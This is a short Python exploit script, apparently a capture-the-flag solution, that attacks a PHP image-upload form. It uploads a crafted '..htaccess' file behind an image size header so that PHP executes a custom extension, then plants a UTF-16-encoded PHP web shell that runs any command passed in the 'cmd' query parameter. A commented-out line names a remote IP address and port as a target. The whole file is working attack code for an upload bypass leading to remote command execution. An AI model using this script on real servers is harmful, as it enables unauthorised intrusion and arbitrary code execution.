import hashlib
import threading
import time

import requests

# HOST = "http://103.127.99.14:10005/"
HOST = "http://localhost/"

SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"


def send_file(fname: str, payload: bytes):
    data = {
        "name": "FlaB",
        "email": "asdasda@adas.xom",
        "desc": "malicious",
        "submit": "Submit",
    }
    file = {"image": (fname, payload)}
    r = requests.post(
        HOST + "index.php",
        data=data,
        files=file,
    )
    assert r.status_code == 200
    if "int(1)" not in r.text:
        print(r.text)


def req_file(fname, params):
    r = requests.get(HOST + "tmp/" + fname, params=params)
    if r.status_code == 200:
        print(r.text)
    print(r.status_code)


def send_htaccess():
    # Send .htaccess
    htaccess_name = "..htaccess"
    htaccess_payload = b"""AddType application/x-httpd-php .php16

php_value zend.multibyte 1
php_value zend.detect_unicode 1
php_value display_errors 1"""
    htaccess_payload = SIZE_HEADER + htaccess_payload

    # Sending File
    send_file(htaccess_name, htaccess_payload)


def send_payload(payload: str):
    payload_name = "payload.php\00"
    payload = SIZE_HEADER + (payload).encode("utf-16be")

    send_file(payload_name, payload)


def exploit():
    send_htaccess()
    payload = "<?php echo shell_exec($_GET['cmd']); ?>"

    send_payload(payload)


exploit()
